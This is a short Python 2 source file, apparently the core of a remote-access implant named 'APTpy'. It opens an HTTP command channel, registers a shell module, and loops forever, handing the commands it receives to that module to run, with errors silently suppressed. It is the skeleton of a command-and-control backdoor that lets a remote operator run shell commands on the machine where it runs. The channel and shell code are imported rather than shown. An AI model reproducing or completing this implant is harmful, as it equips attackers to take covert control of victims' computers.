import Queue
from threading import Event
from time import sleep
DEBUG = True


class APTpy:
    def __init__(self):
        self.channel = None
        self.modules = []
        self.queue_send = Queue.Queue()
        self.queue_recv = Queue.Queue()
        self.events = {}

    def run(self):
        self._checkenv()
        self._registerChannels()
        self._registerModules()

        self.channel.start()

        for module in self.modules:
            module.start()

        while True:
            sleep(0.5)
            if not self.queue_recv.empty():
                cmd = self.queue_recv.get().strip()
                # print cmd
                self.queue_recv.task_done()
                for module in self.modules:
                    if module.its_for_me(cmd):
                        self.events[module.__class__.__name__].set()
                        self.events[module.__class__.__name__].clear()

    def _checkenv(self):
        pass

    def _registerChannels(self):
        from lib.channels.http import HttpChannel

        self.channel = HttpChannel(self.queue_send, self.queue_recv)

    def _registerModules(self):
        from lib.modules.shell import ShellModule

        self.events['ShellModule'] = Event()
        self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))

try:
    obj = APTpy()
    obj.run()
except:
    if DEBUG:
        print "[!] Operation aborted"
